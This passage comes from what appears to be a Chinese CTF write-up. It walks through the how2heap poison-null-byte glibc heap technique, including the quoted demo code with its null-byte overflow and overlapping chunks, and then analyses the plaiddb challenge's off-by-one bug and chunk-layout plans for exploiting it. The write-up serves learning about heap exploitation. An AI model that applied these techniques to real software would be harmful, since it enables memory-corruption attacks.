class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c: %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span></span><br><span class="line">		<span class="string">"The barrier is not strictly necessary, but makes things less confusing\n"</span>, barrier);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span></span><br><span class="line">	<span class="comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span></span><br><span class="line">	<span class="comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span></span><br><span class="line">	<span class="comment">//*(size_t*)(b+0x1f0) = 0x200;</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span></span><br><span class="line">		<span class="string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span>);</span><br><span class="line">	<span class="comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span></span><br><span class="line">	<span class="comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span></span><br><span class="line">	*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">	a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"c.prev_size is %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line">	<span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line">	<span class="comment">// will detect the heap corruption now.</span></span><br><span class="line">	<span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line">	<span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span></span><br><span class="line">	<span class="comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span></span><br><span class="line">	<span class="comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span>,</span><br><span class="line">		*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">	b1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b1: %p\n"</span>,b1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span></span><br><span class="line">		<span class="string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span>,*c_prev_size_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span></span><br><span class="line">		<span class="string">"before c.prev_size: %lx\n"</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We malloc 'b2', our 'victim' chunk.\n"</span>);</span><br><span class="line">	<span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">	b2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"b2: %p\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(b2,<span class="string">'B'</span>,<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Current b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(b1);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"d: %p\n"</span>,d);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now 'd' and 'b2' overlap.\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(d,<span class="string">'D'</span>,<span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New b2 content:\n%s\n"</span>,b2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span></span><br><span class="line">		<span class="string">"for the clear explanation of this technique.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致意思如下：程序首先malloc了四个small chunk（这里我写的是实际大小）接着进行如下操作：</p>
<p><code>0x110（a）    0x210（b）    0x110（c）    0x110（barrier）</code></p>
<ol>
<li>在b chunk的0x200偏移处写上了0x200</li>
<li><code>free(b)</code>，设置c.prev_size=0x210，c.size=0x110（此时b chunk被置入unsorted bin）</li>
<li>通过a的溢出将b.size由0x211改为0x200</li>
<li><code>b1=malloc(0x100)</code>，将b分割出b1（如果不在之前设置fake prev_size，分割时调用unlink会出错）</li>
<li><code>b2=malloc(0x80)//victim chunk</code></li>
<li><code>free(b1)</code>b1被free之后在下一步<code>free(c)</code>时即可通过unlink的检查<code>FD-&gt;bk != P || BK-&gt;fd != P</code></li>
<li><code>free(c)</code>,由于c.prev_size在之前被设置成了0x210，c.size为0x110，所以这个free会将前0x210size的chunk一起合并</li>
<li><code>d=malloc(0x300)</code>，此时d与b2 overlap</li>
</ol>
<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>debug的时候实在是受不了pwndbg里面heap的非hex显示了，于是自己去改了一下pwndbg的脚本（然后被安利了pwngdb和pwndocker，准备这个题写完就去看看）</p>
<p>在pwndbg/pwndbg/commands目录下的heap.py文件里面，找到<code>malloc_chunk</code>函数，然后替换一下注释掉的那行即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print(header, chunk["value"])</span></span><br><span class="line">    print(header,<span class="string">'&#123;'</span>)</span><br><span class="line">    print(<span class="string">'  prev_size   = '</span>+hex(chunk[<span class="string">'prev_size'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'size        = '</span>+hex(chunk[<span class="string">'size'</span>]))</span><br><span class="line">    print(<span class="string">'  fd          = '</span>+hex(chunk[<span class="string">'fd'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'bk          = '</span>+hex(chunk[<span class="string">'bk'</span>]))</span><br><span class="line">    print(<span class="string">'  fd_nextsize = '</span>+hex(chunk[<span class="string">'fd_nextsize'</span>]).ljust(<span class="number">15</span>,chr(<span class="number">0x20</span>)),<span class="string">'bk_nextsize = '</span>+hex(chunk[<span class="string">'bk_nextsize'</span>]))</span><br><span class="line">    print(<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure>

<p>gdb.Value object里面的直接打印的话是十进制显示的一些值，看起来没那么方便，自己可以按照喜欢的格式改一下脚本</p>
<p><strong>第3步执行之后：</strong></p>
<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064511575.png" alt="1581064511575"></p>
<p>ps：这里可以看出来pwndbg的heap显示是根据堆上的size偏移来计算chunk地址的，所以修改size之后会出现这种错位的现象</p>
<p><strong>第5步执行之后：</strong></p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064709879.png" width="70%" height="70%">

<p><strong>第6步执行之后：</strong></p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581064849626.png" width="70%" height="70%">

<p>b1会被再次放入unsorted bin当中，此时b1是在正常bin链上，当然也具备unlink检查的条件</p>
<p>ps：注意第7步执行之后，本来是unlink了b1这个堆块，但是free时会把合并后的堆块再放入unsortedbin，所以在gdb下查看第七步执行之后的bins中unsortedbin是没有变的（毕竟b1和b的首地址时一样的）</p>
<p><strong>第8步执行过程</strong></p>
<p>我调试了很久很久，主要是搭了glibc源码的调试环境然后撸了很久的malloc源码</p>
<p>因为在第八步执行前heap上和chunk的情况是这样的：</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132885745.png" width="60%" height="60%">

<p>但是执行之后变成了这样：</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581132905008.png" width="55%" height="55%">

<p>小的被分割出来的chunk被放入了smallbins，然后<code>malloc(0x300)</code>返回出来的chunk是合并后0x320字节的chunk，照理来说应该是0x310才对，如果是对0x320的chunk进行了切割，剩下的0x10字节是&lt;<code>MINSIZE</code>的，所以得看分配时是不是发生了哪种fit，最后在撸了源码之后，参考xman师傅发的堆ppt看到了这个（不愧是师傅们的总结，tql），不过师傅们的总结这里，unsorted bin大小满足分配需求、剩余大小&lt;<code>MINSIZE</code>时在我这里似乎并不是直接取，因为我撸源码时，里面判断&gt;<code>MINSIZE</code>不成立时直接就把unsortedbin中最后一个块取下来了。</p>
<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581133887238.png" alt="1581133887238"></p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581144994741.png" width="55%" height="55%">

<p><strong>ps:</strong>再就是直接从unsortedbin取chunk要满足上图中未打框的四个条件，这里在第4步<code>malloc(0x100)分割出b1</code>，实际上不是从unsortedbin b直接切出来的，是先把这个chunk放入了对应的smallbins，然后再从smallbins切出来的，剩下的快由于大于<code>MINSIZE</code>，所以再被链入了unsortedbin，此时last_remainder才被初始化（对应剩下的块），看上去b1好像是直接从unsortedbin b直接切出来的实际上不是<em>（所以这里再立个 flag，自己找时间把malloc的全流程稍微详细的写一遍）</em>，所以我发现分割之后的两个chunk中fd和bk不一样，如下(last_remainder也在第一次分割chunk后初始化)：</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581151294350.png" width="70%" height="70%">

<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581152010623.png" alt="1581152010623"></p>
<p><em>如上，首先被链入smallbins</em></p>
<p>回到第八步，ptmalloc源码分析那本PDF里面也写到了best-fit相关：</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581134255040.png" width="60%" height="60%">

<p>此时从对应smallbins中对应下标（0x310-&gt;0x31）的下一个下标（0x320-&gt;0x32）开始找，这里补一个binmap的知识点</p>
<h2 id="binmap-amp-一些流程"><a href="#binmap-amp-一些流程" class="headerlink" title="binmap&amp;一些流程"></a>binmap&amp;一些流程</h2><p>在x64下binmap同样是4个Dword（4*32）</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581139383559.png" width="80%" height="80%">

<p>利用binmap找到best-fit chunk的具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="comment">/* Skip rest of block if there are no more set bits in this block. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">bit</span> &gt; <span class="built_in">map</span> || <span class="built_in">bit</span> == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">				<span class="keyword">goto</span> use_top;</span><br><span class="line">		&#125; <span class="keyword">while</span> ( (<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line">		bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">		<span class="built_in">bit</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//Idx2bit()宏将 idx 指定的位设置为 1，其它位清零， map 表示一个 block（unsigned int）值，如果 bit </span></span><br><span class="line">        <span class="comment">//大于 map，意味着 map 为 0，该 block 所对应的所有 bins 中都没有空闲 chunk，于是遍历 binmap 的下一</span></span><br><span class="line">        <span class="comment">//个 block，直到找到一个不为 0 的 block 或者遍历完所有的 block。退出循环遍历后，设置 bin 指向 block </span></span><br><span class="line">        <span class="comment">//的第一个 bit 对应的 bin，并将 bit 置为 1，表示该 block中 bit 1 对应的 bin，这个 bin 中如果有空闲 </span></span><br><span class="line">        <span class="comment">//chunk，该 chunk 的大小一定满足要求。</span></span><br><span class="line">	</span><br><span class="line">		<span class="keyword">while</span> ((<span class="built_in">bit</span> &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            bin = next_bin(bin);</span><br><span class="line">            <span class="built_in">bit</span> &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            assert(<span class="built_in">bit</span> != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在一个 block 遍历对应的 bin，直到找到一个 bit 不为 0 退出遍历，则该 bit 对于的 bin</span></span><br><span class="line">        <span class="comment">//中有空闲 chunk 存在。</span></span><br><span class="line">        victim = last(bin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后接下来就是一些分配流程</p>
<ul>
<li>如果 victim 与 bin 链表头指针相同，表示该 bin 中没有空闲 chunk， binmap 中的相应位设置不准确，将 binmap 的相应 bit 位清零， 获取当前 bin 下一个 bin，将 bit 移到下一个 bit位，即乘以 2。 </li>
<li>当前 bin 中的最后一个 chunk 满足要求，获取该 chunk 的大小，计算切分出所需 chunk<br>后剩余部分的大小，然后将 victim 从 bin 的链表中取出。 <ul>
<li>如果剩余部分的大小小于 MINSIZE，将整个 chunk 分配给应用层，设置 victim 的状态为inuse，如果当前分配区为非主分配区，设置 victim 的非主分配区标志位。 <strong>（这里就是我们0x320的chunk最终被返回的原因）</strong></li>
<li>否则从 victim 中切分出所需的 chunk，剩余部分作为一个新的 chunk 加入到 unsorted bin 中。如果剩余部分 chunk 属于 small bins，将分配区的 last remainder chunk 设置为剩余部分构成的 chunk； 如果剩余部分 chunk 属于 large bins，将剩余部分 chunk 的 chunk size 链表指针设置为 NULL，因为 unsorted bin 中的 chunk 是不排序的，这两个指针无用，必须清零<ul>
<li>接着设置 victim 和 remainder 的状态，由于 remainder 为空闲 chunk，所以需要设置该 chunk<br>的 foot。 </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>如果以上的分配都没有成功最后就会去寻找top_chunk</p>
<p>这里找到一个ptmalloc简单点的总结：</p>
<ol>
<li>在fastbin中寻找有没有对应的chunk</li>
<li>请求大小为small bin范围，在small bin中寻找有没有对应的chunk</li>
<li>请求大小为large bin范围，仅调用malloc_consolidate合并fastbin</li>
<li>在unsorted bin中寻找有没有合适的chunk</li>
<li>在large bin中寻找有没有合适的chunk</li>
<li>寻找较大的bin链中有没有合适的chunk</li>
<li>寻找top_chunk</li>
<li>top_chunk不够用，调用malloc_consolidate合并fastbin</li>
<li>top_chunk不够用，系统调用再次申请内存</li>
</ol>
<p>原文链接：<a href="https://zhuanlan.zhihu.com/p/77316206" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/77316206</a></p>
<h1 id="plaiddb"><a href="#plaiddb" class="headerlink" title="plaiddb"></a>plaiddb</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>打开IDA茫茫一片23333，然后自己先去把这个程序跑了一下，了解了一下大致的功能，看能不能先理出一点逆向思路来</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227038307.png" width="55%" height="55%">

<p>暂时理解的大概意思就是：GET是获取一个row的内容，PUT是放入一个新的row，DUMP是打印rows的信息，DEL是删除一个row，EXIT就是退出了。</p>
<p>接下来再来分析代码</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581227277632.png" width="70%" height="70%">

<p>因为这个函数里面的运算比较多，而且第一次进去也就是做了一些初始化，所以我就先慢慢分析下面的真正菜单</p>
<hr>
<p>Two hours later…..</p>
<hr>
<p>….逆锤子？结果还是要回到sub_CF0??….两百多行的函数配着循环和goto，快把我给逆疯了好嘛….(wtcl…)</p>
<p>我先是逆出了一个结构体的样子（查了wp发现我这个结构体也还稍微有点问题，0x30处的应该是一个leaf or not的flag标识，我刚开始还以为它代表是否为根节点，不过bss段上存的那个变量应该是根节点指针）：</p>
<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581237156090.png" alt="1581237156090"></p>
<p>是的，我是在里面一次次调试尝试加上静态分析之后才发现这个数据库是用树形结构来实现的，限于数据结构的水平和逆向的代码量….我没有逆出来具体是哪种树，发现是树形结构之后为了不太浪费时间就放弃了逆向…转而查了WP（pwn这边果然是任重而道远啊）</p>
<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581257799309.png" width="70%" height="70%">

<ul>
<li>先申请一个0x40的chunk作为结点</li>
<li>在Enter里面申请一个0x20的chunk存储这个结点的row key</li>
<li>然后再申请一个我们可以控制大小的chunk来存储data<ul>
<li>如果申请失败就free掉前两个chunk</li>
</ul>
</li>
<li>data chunk申请成功，通过freadn来输入data，并尝试将这个结点加入red-black tree</li>
<li>如果加入失败说明之前有相同的row key，树操作会返回相同row key结点的指针成功则返回0<ul>
<li>失败：先free掉<strong>前面的row key chunk</strong>和<strong>已有结点的data chunk</strong>，接着更新<strong>已有结点的data size和data chunk</strong>指针，然后free掉<strong>前面的申请的结点chunk</strong></li>
</ul>
</li>
</ul>
<h3 id="DUMP"><a href="#DUMP" class="headerlink" title="DUMP"></a>DUMP</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258154196.png" width="80%" height="80%">

<ul>
<li>根据某种遍历方式，打印出所有结点的row key还有对应的data size（这里IDA打印函数的参数识别稍微有点问题）</li>
</ul>
<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258239453.png" width="80%" height="80%">

<ul>
<li>Enter时申请一个row key chunk，然后通过对比找到相应结点</li>
<li>打印相应结点的data chunk内容</li>
<li>free掉前面Enter的row key chunk</li>
</ul>
<h3 id="DEL"><a href="#DEL" class="headerlink" title="DEL"></a>DEL</h3><p>茫茫一片的树操作，不过关注点只需要放在chunk的操作上即可</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258527364.png" width="60%" height="60%">

<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258539173.png" alt="1581258539173"></p>
<ul>
<li>Enter一个row key chunk，然后查找对应的结点<ul>
<li>找到了：free对应结点的row key chunk和data chunk然后free结点、free Enter的chunk</li>
<li>没找到：直接退出，没有free Enter的chunk</li>
</ul>
</li>
</ul>
<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>程序存在一个off_by_one,在<code>Enter</code>函数里面</p>
<img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581258784894.png" width="75%" height="75%">

<p>当chunk_ptr_now - chunk_ptr == usable_size时，最后一步操作 <code>*chunk_ptr_now=0</code>会越界赋值0</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>程序的流程是终于捋出来了，但是这个利用好想需要想一想，每次都是几个chunk一起操作（特别是PUT的时候），以前做的利用都比较单一，没有这么复杂。</p>
<hr>
<p>回想一下前面的<code>poison_null_byte.c</code></p>
<ul>
<li>free掉两个chunk中间的一个chunk（free之前先设置一个假的prev_size来通过malloc的检查，和之前那篇里面的fake size目的是不一样的，一个是为了通过free的检查一个是为了通过malloc的检查）（free之后第三个chunk的prev_inuse位就为0了）</li>
<li>用第一个chunk的off_by_one来影响第二个chunk的size字段</li>
<li>malloc两个小一点的chunk：b1&amp;b2</li>
<li>free b1之后free第三个chunk，此时第三个chunk和b2 overlap</li>
</ul>
<hr>
<p>那到这个题里面应该怎么利用呢emmm…..把断点下在第一次输入完命令DUMP之后(dump执行完不会影响heap)，调试看一下</p>
<p><img src="/2020/02/10/how2heap-poison-null-byte-plaiddb/1581260525230.png" alt="1581260525230"></p>
<p>此时堆中的chunks就是我们前面初始化的第一个结点还有对应的row key chunk和data chunk</p>
<p>在这些chunk里面，结点chunk还有row key chunk都是指定大小的fastchunk，只有data可以为不同的chunk，然后存在漏洞的<code>Enter</code>函数是只被row key chunk调用的，所以off_by_one只发生在row key chunk生成时后面紧跟着的chunk</p>
<h3 id="各处的malloc（初始化之后的）"><a href="#各处的malloc（初始化之后的）" class="headerlink" title="各处的malloc（初始化之后的）"></a>各处的malloc（初始化之后的）</h3><p>PUT中的chunk申请顺序：结点 -&gt; row key -&gt; data</p>
<p>GET中只申请了一个row key</p>
<p>DEL中也只有一个row key</p>
<h3 id="各处的free"><a href="#各处的free" class="headerlink" title="各处的free"></a>各处的free</h3><p>PUT中：</p>
<ul>
<li>data申请失败会free掉PUT函数中申请的row key chunk和结点chunk</li>
<li>输入的row key已存在时会free PUT函数中申请的row key chunk和已有结点的data chunk，还有前面的结点chunk</li>
</ul>
<p>GET中无论如何都会free用来查找的row key chunk</p>
<p>DEL中：</p>
<ul>
<li>找到了：free对应结点的row key chunk、data chunk然后free结点、free Enter的chunk</li>
<li>没找到：直接退出，没有free Enter的chunk</li>
</ul>
<hr>
<h3 id="第一思路："><a href="#第一思路：" class="headerlink" title="第一思路："></a>第一思路：</h3><p>在初始化的基础上，再申请两个节点，此时堆中就会有以下结构</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x??????</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>row key1</td>
<td>data1</td>
<td>结点2</td>
<td>row key2</td>
<td>data2</td>
<td>结点3</td>
<td>row key3</td>
<td>data3</td>
<td>top_chunk</td>
</tr>
</tbody></table>
<p>接着删除第二个结点</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x20</th>
<th>0x??????</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>row key1</td>
<td>data1</td>
<td>结点2</td>
<td>row key2</td>
<td>data2</td>
<td>结点3</td>
<td>row key3</td>
<td>data3</td>
<td>row key4</td>
<td>top_chunk</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td>fastbin</td>
<td>?bin</td>
<td></td>
<td></td>
<td></td>
<td>fastbin</td>
<td></td>
</tr>
</tbody></table>
<p>此时0x20的fastbin中是row key4-&gt;row key2</p>
<p>然后通过DEL中没有free Enter chunk，申请两次，从而第二次可以在row key2处对data2造成off_by_one（既然能off_by_one，data2就肯定不是fastchunk了）</p>
<p>但是还有一点，off_by_one发生之后，如果我们的目的是用例子的那种overlap，这是结点3是一个fastchunk，free的时候并不会向前合并，所以这个思路显然不行</p>
<p>ps：然而当我写完后面的再回来看的时候，这里又是我立的一个flag，或者说我当时写到这里的时候还对构造不太熟悉，如果把两个data chunk构造在一起好像也不是不行（只要删掉前面一个结点，就会在fastbin中腾出位置来，再申请一个有大于之前data块的结点就可以了），主要是写后面的构造方法写着写着就忘了前面这个我想到的用DEL填充来off_by_one然后合并前面的chunk的方法，如果用这种方式来构造的话可以这样构造：</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0xd0</th>
<th>0x40</th>
<th>0x20</th>
<th>0x70</th>
<th>0x40</th>
<th>0x20</th>
<th>0x100</th>
<th>0x40</th>
<th>0x20</th>
<th>0x40</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>rowkey1</td>
<td>data1</td>
<td>结点2</td>
<td>rowkey2</td>
<td>data2</td>
<td>结点3</td>
<td>rowkey3</td>
<td>data3</td>
<td></td>
<td></td>
<td>data5</td>
<td>结点5</td>
<td>rowkey5</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>fastbin2</td>
<td>fastbin1</td>
<td></td>
<td></td>
<td></td>
<td>fastbin2</td>
<td></td>
</tr>
</tbody></table>
<hr>
<h3 id="第二思路："><a href="#第二思路：" class="headerlink" title="第二思路："></a>第二思路：</h3><table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x??????</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>row key1</td>
<td>data1</td>
<td>结点2</td>
<td>row key2</td>
<td>data2</td>
<td>结点3</td>
<td>row key3</td>
<td>data3</td>
<td>top_chunk</td>
</tr>
</tbody></table>
<p>还是先产生这样的结构，不过此时row key3是和row key2一样的，主要是想让结点2中的data2改到data3去，然后就会变成这样</p>
<table>
<thead>
<tr>
<th>0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x??????</th>
</tr>
</thead>
<tbody><tr>
<td>结点1</td>
<td>row key1</td>
<td>data1</td>
<td>结点2</td>
<td>row key2</td>
<td>data2_old</td>
<td>结点3</td>
<td>row key3</td>
<td>data2_n</td>
<td>top_chunk</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>?bin</td>
<td>fastbin</td>
<td>fastbin</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>然后接着构造（data3要大过data2_old）</p>
<table>
<thead>
<tr>
<th align="left">0x40</th>
<th>0x20</th>
<th>0x20</th>
<th>0x40</th>
<th>0x20</th>
<th>0x???</th>
<th>0x40</th>
<th>0x20</th>
<th>0x?00</th>
<th>0x???</th>
<th>0x??????</th>
</tr>
</thead>
<tbody><tr>
<td align="left">结点1</td>
<td>rowkey1</td>
<td>data1</td>
<td>结点2</td>
<td>rowkey2</td>
<td>data2_old</td>
<td>结点3</td>
<td>rowkey3</td>
<td>data2_n</td>
<td>data3</td>
<td>top_chunk</td>
</tr>
<tr>
<td align="left"></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>?bin</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>申请新的结点3，并在此时对data2_n构成off_by_one并写好prev_size</p>
